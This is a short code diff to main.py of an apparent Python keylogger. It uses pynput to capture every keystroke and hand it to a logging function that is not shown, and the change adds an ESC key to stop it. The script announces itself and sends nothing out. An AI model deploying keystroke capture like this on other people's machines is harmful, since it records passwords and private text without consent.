@@ -1,14 +1,17 @@
-# main.py
-
 from pynput import keyboard
 from logger import key_pressed
 
+def on_press(key):
+    if key == keyboard.Key.esc:
+        print("ESC pressed. Stopping keylogger.")
+        return False
+    key_pressed(key)
+
 def main():
     """Start the keylogger."""
-    listener = keyboard.Listener(on_press=key_pressed)
-    listener.start()
     print("Keylogger started. Press ESC to stop.")
-    listener.join()  # This will block until the listener stops
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
 
 if __name__ == "__main__":
     main()
